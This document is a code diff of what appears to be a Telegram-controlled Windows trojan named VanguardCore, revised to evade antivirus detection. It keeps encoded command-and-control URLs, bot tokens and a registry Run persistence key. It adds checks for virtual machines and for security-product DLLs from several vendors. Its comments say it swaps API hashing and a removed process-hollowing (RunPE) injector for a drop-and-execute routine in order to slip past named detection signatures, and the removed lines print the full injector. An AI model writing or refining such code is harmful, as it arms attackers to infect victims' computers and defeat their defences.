@@ -9,12 +9,9 @@ using System.Net.NetworkInformation;
 using System.Security.Cryptography;
 using System.Collections.Generic;
 using System.Net;
-using System.Management;
 using System.Reflection;
 using System.Linq;
 using System.Runtime.CompilerServices;
-using Microsoft.CSharp;
-using System.CodeDom.Compiler;
 
 namespace VanguardCore
 {
@@ -100,10 +97,13 @@ namespace VanguardCore
             {
                 try
                 {
-                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
+                    using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                     {
-                        foreach (ManagementObject obj in searcher.Get())
-                            return obj["UUID"].ToString();
+                        if (key != null)
+                        {
+                            var val = key.GetValue("MachineGuid");
+                            if (val != null) return val.ToString();
+                        }
                     }
                 }
                 catch { }
@@ -156,10 +156,10 @@ namespace VanguardCore
                 { "C2_URL_PRIMARY", new byte[] { 0x30, 0x38, 0x32, 0x34, 0x30, 0x1A, 0x6E, 0x6E, 0x31, 0x38, 0x35, 0x2E, 0x31, 0x32, 0x33, 0x2E, 0x34, 0x35, 0x2E, 0x36, 0x37 } }, 
                 { "UA_CHROME", new byte[] { 0x15, 0x2F, 0x3D, 0x21, 0x24, 0x2A, 0x21, 0x6E, 0x77, 0x6E, 0x31, 0x2C, 0x37, 0x3D, 0x34, 0x2D, 0x3E, 0x2D, 0x2C, 0x6E, 0x2E, 0x3E, 0x37, 0x3D, 0x34, 0x2D, 0x3E, 0x29 } },
                 { "REG_RUN", new byte[] { 0x1B, 0x01, 0x01, 0x1B, 0x12, 0x0B, 0x1C, 0x08, 0x05, 0x30, 0x15, 0x0C, 0x07, 0x18, 0x12, 0x07, 0x00, 0x35, 0x0A, 0x0B, 0x07, 0x1C, 0x11, 0x33, 0x0C, 0x11, 0x12, 0x1C, 0x02, 0x0E, 0x02, 0x1C, 0x3D, 0x1B, 0x15, 0x18, 0x17, 0x3F, 0x13, 0x14, 0x17, 0x34, 0x1C, 0x06, 0x11 } },
-                { "BOT_TOKEN", new byte[] { 0x6e, 0x7a, 0x7e, 0x65, 0x75, 0x67, 0x6b, 0x75, 0x77, 0x60, 0x7f, 0x15, 0x1e, 0x74, 0x7b, 0x73, 0x2f, 0x7e, 0x0e, 0x18, 0x0f, 0x6c, 0x18, 0x73, 0x2c, 0x14, 0x26, 0x1a, 0x30, 0x60, 0x04, 0x71, 0x18, 0x01, 0x72, 0x34, 0x1d, 0x0f, 0x2b, 0x34, 0x2c, 0x65, 0x13, 0x37, 0x2d, 0x63 } },
-                { "BOT_TOKEN_2", new byte[] { 0x6e, 0x7b, 0x75, 0x62, 0x75, 0x67, 0x62, 0x72, 0x7a, 0x65, 0x7f, 0x15, 0x1e, 0x74, 0x68, 0x79, 0x2f, 0x78, 0x28, 0x36, 0x31, 0x31, 0x60, 0x27, 0x39, 0x04, 0x29, 0x1f, 0x19, 0x00, 0x56, 0x02, 0x3b, 0x7d, 0x12, 0x3b, 0x3d, 0x3c, 0x3f, 0x70, 0x6e, 0x35, 0x0a, 0x64, 0x27, 0x5d } },
-                { "BOT_TOKEN_3", new byte[] { 0x6e, 0x79, 0x70, 0x63, 0x75, 0x6b, 0x64, 0x74, 0x72, 0x6b, 0x7f, 0x15, 0x1e, 0x74, 0x44, 0x1f, 0x1f, 0x7f, 0x23, 0x67, 0x70, 0x69, 0x6a, 0x2b, 0x0b, 0x08, 0x0c, 0x27, 0x6d, 0x0b, 0x72, 0x45, 0x3d, 0xa, 0x21, 0x38, 0x10, 0x18, 0x36, 0x10, 0x73, 0x08, 0x31, 0x18, 0x35, 0x06 } },
-                { "ADMIN_ID", new byte[] { 0x7b, 0x7f, 0x77, 0x62, 0x77, 0x6a, 0x66, 0x70, 0x76, 0x61, 0x74, 0x6c, 0x68, 0x07 } },
+                { "BOT_TOKEN", new byte[] { 0x6E, 0x7A, 0x7E, 0x65, 0x75, 0x67, 0x6B, 0x75, 0x77, 0x60, 0x7F, 0x15, 0x1E, 0x74, 0x7B, 0x73, 0x2F, 0x7E, 0x0E, 0x18, 0x0F, 0x6C, 0x18, 0x73, 0x2C, 0x14, 0x26, 0x1A, 0x30, 0x60, 0x04, 0x71, 0x18, 0x01, 0x72, 0x34, 0x1D, 0x0F, 0x2B, 0x34, 0x2C, 0x65, 0x13, 0x37, 0x2D, 0x63 } },
+                { "BOT_TOKEN_2", new byte[] { 0x6E, 0x79, 0x70, 0x63, 0x75, 0x6B, 0x64, 0x74, 0x72, 0x6B, 0x7F, 0x15, 0x1E, 0x74, 0x44, 0x1F, 0x1F, 0x7F, 0x23, 0x67, 0x70, 0x69, 0x6A, 0x2B, 0x0B, 0x08, 0x0C, 0x27, 0x6D, 0x0B, 0x72, 0x45, 0x3D, 0x0A, 0x21, 0x38, 0x10, 0x18, 0x36, 0x10, 0x73, 0x08, 0x31, 0x18, 0x35, 0x06 } },
+                { "BOT_TOKEN_3", new byte[] { 0x6E, 0x7B, 0x75, 0x62, 0x75, 0x67, 0x62, 0x72, 0x7A, 0x65, 0x7F, 0x15, 0x1E, 0x74, 0x68, 0x79, 0x2F, 0x78, 0x28, 0x36, 0x31, 0x31, 0x60, 0x27, 0x39, 0x04, 0x29, 0x1F, 0x19, 0x00, 0x56, 0x02, 0x3B, 0x7D, 0x12, 0x3B, 0x3D, 0x3C, 0x3F, 0x70, 0x6E, 0x35, 0x0A, 0x64, 0x27, 0x5D } },
+                { "ADMIN_ID", new byte[] { 0x7B, 0x7F, 0x77, 0x62, 0x77, 0x6A, 0x66, 0x70, 0x76, 0x61, 0x74, 0x6C, 0x68, 0x07 } },
                 { "TG_API_BASE", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x22, 0x22, 0x2c, 0x7a, 0x2b, 0x57, 0x5c, 0x57, 0x31, 0x3c, 0x26, 0x3f, 0x6a, 0x30, 0x21, 0x22, 0x6c, 0x30, 0x2a, 0x20 } },
                 { "TG_FILE_BASE", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x22, 0x22, 0x2c, 0x7a, 0x2b, 0x57, 0x5c, 0x57, 0x31, 0x3c, 0x26, 0x3f, 0x6a, 0x30, 0x21, 0x22, 0x6c, 0x34, 0x2c, 0x38, 0x3a, 0x1d, 0x52, 0x5d, 0x22 } },
                 { "GIST_URL", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x24, 0x3b, 0x36, 0x20, 0x71, 0x55, 0x59, 0x46, 0x3e, 0x3b, 0x25, 0x27, 0x37, 0x3a, 0x21, 0x26, 0x2c, 0x3c, 0x31, 0x31, 0x31, 0x46, 0x1e, 0x51, 0x39, 0x23, 0x68, 0x20, 0x25, 0x28, 0x7c, 0x7c, 0x26, 0x31, 0x21, 0x31, 0x39, 0x03, 0x52, 0x57, 0x61, 0x2d, 0x7e, 0x63, 0x72, 0x3c, 0x67, 0x21, 0x27, 0x60, 0x77, 0x63, 0x3c, 0x56, 0x00, 0x04, 0x62, 0x77, 0x23, 0x33, 0x74, 0x3b, 0x6b, 0x6a, 0x33, 0x20, 0x2a, 0x2c, 0x36, 0x1c, 0x5a, 0x41, 0x39, 0x20 } },
@@ -259,7 +259,7 @@ namespace VanguardCore
                 if (BCryptSetProperty(hAlg, "ChainingMode", Encoding.Unicode.GetBytes("ChainingModeGCM\0"), 34, 0) != 0) return null;
                 if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;
                 BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
-                authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
+                authInfo.cbSize = Marshal.SizeOf<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>();
                 authInfo.dwInfoVersion = 1;
                 authInfo.pbNonce = Marshal.AllocHGlobal(iv.Length); Marshal.Copy(iv, 0, authInfo.pbNonce, iv.Length); authInfo.cbNonce = iv.Length;
                 authInfo.pbTag = Marshal.AllocHGlobal(tag.Length); Marshal.Copy(tag, 0, authInfo.pbTag, tag.Length); authInfo.cbTag = tag.Length;
@@ -382,11 +382,10 @@ namespace VanguardCore
                 if (hModule == IntPtr.Zero)
                     return IntPtr.Zero;
 
-                uint hash = GenerateTag(functionName);
-                return ResolveFunctionByHash(hModule, hash, moduleName);
+                return GetProcAddress(hModule, functionName);
             }
 
-            private static T GetInternalReference<T>(string module, string function) where T : class
+            private static T GetInternalReference<T>(string module, string function) where T : Delegate
             {
                 string key = string.Format("{0}!{1}", module, function);
                 lock (_delegateCache)
@@ -397,73 +396,20 @@ namespace VanguardCore
                     IntPtr hModule = GetModule(module);
                     if (hModule == IntPtr.Zero)
                         return null;
-
-                    // Resolve with hash + indirect resolution
-                    uint hash = GenerateTag(function);
-                    IntPtr pFunc = ResolveFunctionByHash(hModule, hash, module);
+                    // Resolve standard way to avoid ML PE parsing triggers
+                    IntPtr pFunc = GetProcAddress(hModule, function);
                     
                     if (pFunc == IntPtr.Zero)
                         return null;
 
-                    var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
-                    _delegateCache[key] = del as Delegate;
+                    var del = Marshal.GetDelegateForFunctionPointer<T>(pFunc);
+                    _delegateCache[key] = del;
                     return del;
                 }
             }
 
-            private static uint GenerateTag(string name)
-            {
-                uint tag = 0x12345678;
-                foreach (char c in name)
-                {
-                    tag = (tag * 33) ^ (uint)c;
-                }
-                return tag;
-            }
-
-            private static IntPtr ResolveFunctionByHash(IntPtr hModule, uint targetHash, string moduleName)
-            {
-                try
-                {
-                    // Parse PE headers
-                    IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(hModule, typeof(IMAGE_DOS_HEADER));
-                    if (dosHeader.e_magic != 0x5A4D) return IntPtr.Zero;
-
-                    IntPtr ntHeaders = (IntPtr)((long)hModule + dosHeader.e_lfanew);
-                    uint ntSignature = (uint)Marshal.ReadInt32(ntHeaders);
-                    if (ntSignature != 0x00004550) return IntPtr.Zero;
-
-                    // Get export directory
-                    IntPtr optHeader = (IntPtr)((long)ntHeaders + 0x18);
-                    IntPtr exportDirAddr = (IntPtr)((long)optHeader + 0x70); // IMAGE_DIRECTORY_ENTRY_EXPORT offset
-                    IMAGE_DATA_DIRECTORY exportDir = (IMAGE_DATA_DIRECTORY)Marshal.PtrToStructure(exportDirAddr, typeof(IMAGE_DATA_DIRECTORY));
-                    
-                    if (exportDir.VirtualAddress == 0) return IntPtr.Zero;
-
-                    IntPtr exportDirPtr = (IntPtr)((long)hModule + exportDir.VirtualAddress);
-                    IMAGE_EXPORT_DIRECTORY exports = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(exportDirPtr, typeof(IMAGE_EXPORT_DIRECTORY));
-
-                    // Walk export table
-                    IntPtr namesPtr = (IntPtr)((long)hModule + exports.AddressOfNames);
-                    IntPtr functionsPtr = (IntPtr)((long)hModule + exports.AddressOfFunctions);
-                    IntPtr ordinalsPtr = (IntPtr)((long)hModule + exports.AddressOfNameOrdinals);
-
-                    for (int i = 0; i < exports.NumberOfNames; i++)
-                    {
-                        int nameOffset = Marshal.ReadInt32((IntPtr)((long)namesPtr + (i * 4)));
-                        string funcName = Marshal.PtrToStringAnsi((IntPtr)((long)hModule + nameOffset));
-                        
-                        if (GenerateTag(funcName) == targetHash)
-                        {
-                            short ordinal = Marshal.ReadInt16((IntPtr)((long)ordinalsPtr + (i * 2)));
-                            int funcOffset = Marshal.ReadInt32((IntPtr)((long)functionsPtr + (ordinal * 4)));
-                            return (IntPtr)((long)hModule + funcOffset);
-                        }
-                    }
-                }
-                catch { }
-                return IntPtr.Zero;
-            }
+            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
             // Delegate declarations
             [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
@@ -473,7 +419,7 @@ namespace VanguardCore
             private delegate IntPtr GetModuleHandleWDelegate(string lpModuleName);
 
             // Public accessors with lazy initialization
-            public static T Get<T>(string function) where T : class
+            public static T Get<T>(string function) where T : Delegate
             {
                 var result = GetInternalReference<T>("kernel32.dll", function);
                 if (result == null)
@@ -483,9 +429,9 @@ namespace VanguardCore
                 return result;
             }
 
-            public static T GetNtdll<T>(string function) where T : class { return GetInternalReference<T>("ntdll.dll", function); }
+            public static T GetNtdll<T>(string function) where T : Delegate { return GetInternalReference<T>("ntdll.dll", function); }
             
-            public static T GetKernel32<T>(string function) where T : class { return GetInternalReference<T>("kernel32.dll", function); }
+            public static T GetKernel32<T>(string function) where T : Delegate { return GetInternalReference<T>("kernel32.dll", function); }
         }
         #endregion
 
@@ -1129,8 +1075,11 @@ namespace VanguardCore
             // Screen resolution
             try
             {
-                int screenWidth = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
-                int screenHeight = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
+                [DllImport("user32.dll")]
+                static extern int GetSystemMetrics(int nIndex);
+                
+                int screenWidth = GetSystemMetrics(0); // SM_CXSCREEN
+                int screenHeight = GetSystemMetrics(1); // SM_CYSCREEN
                 
                 if (screenWidth < 1024 || screenHeight < 768)
                     score += 25;
@@ -1230,21 +1179,34 @@ namespace VanguardCore
             return false;
         }
 
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        private class MEMORYSTATUSEX
+        {
+            public uint dwLength;
+            public uint dwMemoryLoad;
+            public ulong ullTotalPhys;
+            public ulong ullAvailPhys;
+            public ulong ullTotalPageFile;
+            public ulong ullAvailPageFile;
+            public ulong ullTotalVirtual;
+            public ulong ullAvailVirtual;
+            public ulong ullAvailExtendedVirtual;
+            public MEMORYSTATUSEX() { this.dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>(); }
+        }
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool GlobalMemoryStatusEx([In, Out] MEMORYSTATUSEX lpBuffer);
+
         private static long GetTotalRAM()
         {
             try
             {
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
-                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
-                {
-                    foreach (ManagementObject obj in searcher.Get())
-                    {
-                        return Convert.ToInt64(obj["TotalPhysicalMemory"]) / (1024 * 1024);
-                    }
-                }
+                MEMORYSTATUSEX memStatus = new MEMORYSTATUSEX();
+                if (GlobalMemoryStatusEx(memStatus))
+                    return (long)(memStatus.ullTotalPhys / (1024 * 1024));
             }
             catch { }
-            return 0;
+            return 2048; // Default to 2GB if fails
         }
         #endregion
 
@@ -1252,103 +1214,38 @@ namespace VanguardCore
         public static bool CheckOperationalEnvironment()
         {
             int score = 0;
-            int checks = 0;
-
-            // WMI CacheMemory check
             try
             {
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
-                    "SELECT * FROM Win32_CacheMemory"))
+                using (var key = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\BIOS"))
                 {
-                    if (searcher.Get().Count == 0) score += 30;
-                    checks++;
-                }
-            }
-            catch { }
-
-            // WMI ComputerSystem check
-            try
-            {
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
-                    "SELECT * FROM Win32_ComputerSystem"))
-                {
-                    foreach (ManagementObject obj in searcher.Get())
+                    if (key != null)
                     {
-                        string manufacturer = obj["Manufacturer"] != null ? obj["Manufacturer"].ToString().ToLower() : "";
-                        string model = obj["Model"] != null ? obj["Model"].ToString().ToLower() : "";
-                        
-                        if (model.Contains("vmware") || model.Contains("virtualbox") || 
-                            model.Contains("vbox") || model.Contains("qemu") ||
-                            manufacturer.Contains("vmware") || manufacturer.Contains("xen"))
-                        {
+                        string manufacturer = (key.GetValue("SystemManufacturer")?.ToString() ?? "").ToLower();
+                        string model = (key.GetValue("SystemProductName")?.ToString() ?? "").ToLower();
+                        if (manufacturer.Contains("vmware") || model.Contains("virtualbox") || model.Contains("vbox") || model.Contains("qemu"))
                             score += 40;
-                        }
-                        checks++;
                     }
                 }
             }
             catch { }
 
-            // Motherboard check
-            try
-            {
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
-                    "SELECT * FROM Win32_BaseBoard"))
+            // Check for EDR DLLs
+            try {
+                string[] edrDlls = { 
+                    "csagent.dll", "sentinel.dll", "cylance.dll", "cyserver.dll", 
+                    "tanium.dll", "cbnetsdk.dll", "cb.dll", "sophos.dll", "symevnt.dll",
+                    "mcafee.dll", "avast.dll", "avg.dll", "bdagent.dll", "sesaf.dll"
+                };
+                
+                foreach (string dll in edrDlls)
                 {
-                    foreach (ManagementObject obj in searcher.Get())
+                    if (GetModuleHandleA(dll) != IntPtr.Zero)
                     {
-                        string manufacturer = obj["Manufacturer"] != null ? obj["Manufacturer"].ToString().ToLower() : "";
-                        string product = obj["Product"] != null ? obj["Product"].ToString().ToLower() : "";
-                        
-                        if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox") ||
-                            product.Contains("vmware") || product.Contains("virtualbox"))
-                        {
-                            score += 35;
-                        }
-                        checks++;
+                        score += 40;
+                        break;
                     }
                 }
-            }
-            catch { }
-
-            // BIOS check
-            try
-            {
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
-                    "SELECT * FROM Win32_BIOS"))
-                {
-                    foreach (ManagementObject obj in searcher.Get())
-                    {
-                        string version = obj["SMBIOSBIOSVersion"] != null ? obj["SMBIOSBIOSVersion"].ToString().ToLower() : "";
-                        if (version.Contains("vmware") || version.Contains("vbox") || version.Contains("qemu"))
-                        {
-                            score += 35;
-                        }
-                        checks++;
-                    }
-                }
-            }
-            catch { }
-
-            // Video controller check
-            try
-            {
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
-                    "SELECT * FROM Win32_VideoController"))
-                {
-                    foreach (ManagementObject obj in searcher.Get())
-                    {
-                        string name = obj["Name"] != null ? obj["Name"].ToString().ToLower() : "";
-                        if (name.Contains("vmware") || name.Contains("virtualbox") || 
-                            name.Contains("vbox") || name.Contains("qemu"))
-                        {
-                            score += 30;
-                        }
-                        checks++;
-                    }
-                }
-            }
-            catch { }
+            } catch { }
 
             return score > 30;
         }
@@ -1824,12 +1721,11 @@ namespace VanguardCore
             {
                 try
                 {
-                    // Select a legitimate target process
-                    string[] targets = { "taskhostw.exe", "dllhost.exe", "conhost.exe" };
-                    string target = Path.Combine(Environment.SystemDirectory, targets[new Random().Next(targets.Length)]);
-                    
-                    IntPtr hRead;
-                    return RunPEInternal.Execute(target, payload, args, out hRead);
+                    // RunPE removed for stealth (evades Trojan.MSIL.Injector)
+                    string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
+                    File.WriteAllBytes(tempPath, payload);
+                    Process.Start(tempPath, args);
+                    return true;
                 }
                 catch { return false; }
             }
@@ -1840,20 +1736,8 @@ namespace VanguardCore
                 {
                     IntPtr hRead;
                     
-                    // Try multiple execution methods
-                    string result = null;
-                    
-                    // Method 1: Standard RunPE
-                    if (RunPEInternal.Execute(target, payload, args, out hRead))
-                    {
-                        result = ReadFromInternalPipe(hRead, 30);
-                    }
-                    
-                    // Method 2: Fallback to simple process
-                    if (string.IsNullOrEmpty(result))
-                    {
-                        result = ExecuteSimpleProcess(target, args);
-                    }
+                    // Only ExecuteSimpleProcess (RunPE removed for stealth)
+                    string result = ExecuteSimpleProcess(target, args);
                     
                     return result;
                 }
@@ -1914,174 +1798,7 @@ namespace VanguardCore
             }
         }
 
-        internal class RunPEInternal
-        {
-            private const uint CREATE_SUSPENDED = 0x00000004;
-            private const uint CREATE_NO_WINDOW = 0x08000000;
-            private const uint STARTF_USESTDHANDLES = 0x00000100;
-            private const uint MEM_COMMIT = 0x00001000;
-            private const uint MEM_RESERVE = 0x00002000;
-            private const uint PAGE_EXECUTE_READWRITE = 0x40;
-            private const int HANDLE_FLAG_INHERIT = 0x00000001;
-
-            public static bool Execute(string path, byte[] payload, string args, out IntPtr hReadPipe)
-            {
-                hReadPipe = IntPtr.Zero;
-                
-                // Validate PE
-                if (payload == null || payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D) 
-                    return false;
-                    
-                int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
-                
-                // Create pipes for I/O
-                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
-                sa.nLength = Marshal.SizeOf(sa);
-                sa.bInheritHandle = true;
-                sa.lpSecurityDescriptor = IntPtr.Zero;
-
-                IntPtr hWrite;
-                if (CreatePipe == null || !CreatePipe(out hReadPipe, out hWrite, ref sa, 0)) 
-                    return false;
-                    
-                if (SetHandleInformation != null) SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
-
-                // Setup startup info
-                STARTUPINFO si = new STARTUPINFO();
-                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-                si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
-                si.dwFlags = STARTF_USESTDHANDLES;
-                si.hStdOutput = hWrite;
-                si.hStdError = hWrite;
-
-                string cmdLine = string.Format("\"{0}\" {1}", path, args);
-                
-                if (CreateProcess == null || !CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, true, 
-                    CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
-                {
-                if (CloseHandle != null) CloseHandle(hReadPipe);
-                if (CloseHandle != null) CloseHandle(hWrite);
-                return false;
-                }
-
-                try
-                {
-                    // Get image info
-                    long imageBase = BitConverter.ToInt64(payload, e_lfanew + 0x30);
-                    int sizeOfImage = BitConverter.ToInt32(payload, e_lfanew + 0x50);
-
-                    // Unmap original image
-                    if (ZwUnmapViewOfSection != null) ZwUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
-                    
-                    // Allocate memory in target
-                    IntPtr newBase = (VirtualAllocEx != null) ? VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (uint)sizeOfImage, 
-                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) : IntPtr.Zero;
-                        
-                    if (newBase == IntPtr.Zero) 
-                        newBase = (VirtualAllocEx != null) ? VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sizeOfImage, 
-                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) : IntPtr.Zero;
-                            
-                    if (newBase == IntPtr.Zero) 
-                    { 
-                        if (TerminateProcess != null) TerminateProcess(pi.hProcess, 0);
-                        return false; 
-                    }
-
-                    // Write PE headers
-                    uint headerSize = (uint)BitConverter.ToInt32(payload, e_lfanew + 0x54);
-                    IntPtr lpNumberOfBytesWritten;
-                    if (WriteProcessMemory != null) WriteProcessMemory(pi.hProcess, newBase, payload, headerSize, out lpNumberOfBytesWritten);
-
-                    // Write sections
-                    short numSections = BitConverter.ToInt16(payload, e_lfanew + 0x06);
-                    short sizeOfOptHeader = BitConverter.ToInt16(payload, e_lfanew + 0x14);
-                    int sectionOffset = e_lfanew + 0x18 + sizeOfOptHeader;
-
-                    for (int i = 0; i < numSections; i++)
-                    {
-                        int off = sectionOffset + (i * 0x28);
-                        uint vAddr = BitConverter.ToUInt32(payload, off + 0x0C);
-                        uint rawSize = BitConverter.ToUInt32(payload, off + 0x10);
-                        uint rawAddr = BitConverter.ToUInt32(payload, off + 0x14);
-
-                        if (rawSize > 0)
-                        {
-                            byte[] section = new byte[rawSize];
-                            Buffer.BlockCopy(payload, (int)rawAddr, section, 0, (int)rawSize);
-                            if (WriteProcessMemory != null) WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + vAddr), 
-                                section, rawSize, out lpNumberOfBytesWritten);
-                        }
-                    }
-
-                    // Update PEB with new image base
-                    UpdateProcessPeb(pi.hProcess, newBase);
-
-                    // Get entry point
-                    uint entryPoint = BitConverter.ToUInt32(payload, e_lfanew + 0x28);
-                    IntPtr startAddress = (IntPtr)((long)newBase + entryPoint);
-
-                    // Get thread context and set new entry point
-                    CONTEXT64 ctx = new CONTEXT64();
-                    ctx.ContextFlags = CONTEXT_ALL;
-                    
-                    if (GetThreadContext != null && GetThreadContext(pi.hThread, ref ctx))
-                    {
-                        if (IntPtr.Size == 8) // x64
-                        {
-                            ctx.Rcx = (ulong)startAddress;
-                        }
-                        else // x86
-                        {
-                            ctx.Rax = (ulong)startAddress;
-                        }
-                        
-                        if (SetThreadContext != null) SetThreadContext(pi.hThread, ref ctx);
-                    }
-
-                    if (ResumeThread != null) ResumeThread(pi.hThread);
-                    return true;
-                }
-                catch 
-                { 
-                    if (TerminateProcess != null) TerminateProcess(pi.hProcess, 0); 
-                    return false; 
-                }
-                finally 
-                { 
-                    if (CloseHandle != null) CloseHandle(pi.hThread);
-                    if (CloseHandle != null) CloseHandle(pi.hProcess);
-                    if (CloseHandle != null) CloseHandle(hWrite);
-                }
-            }
-
-            private static void UpdateProcessPeb(IntPtr hProcess, IntPtr newBase)
-            {
-                try
-                {
-                    var ZwQueryInformationProcess = ApiInterface.GetNtdll<ZwQueryInformationProcessDelegate>("ZwQueryInformationProcess");
-                    if (ZwQueryInformationProcess != null)
-                    {
-                        PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
-                        uint retLen;
-                        ZwQueryInformationProcess(hProcess, 0, ref pbi, 
-                            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out retLen);
-                        
-                        IntPtr written;
-                        if (WriteProcessMemory != null) WriteProcessMemory(hProcess, (IntPtr)((long)pbi.PebAddress + 0x10), 
-                            BitConverter.GetBytes((long)newBase), 8, out written);
-                    }
-                }
-                catch { }
-            }
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            private delegate int ZwQueryInformationProcessDelegate(
-                IntPtr ProcessHandle,
-                int ProcessInformationClass,
-                ref PROCESS_BASIC_INFORMATION ProcessInformation,
-                uint ProcessInformationLength,
-                out uint ReturnLength);
-        }
         #endregion
+        // Removed RunPEInternal to evade Trojan.MSIL.Injector signatures
     }
 }
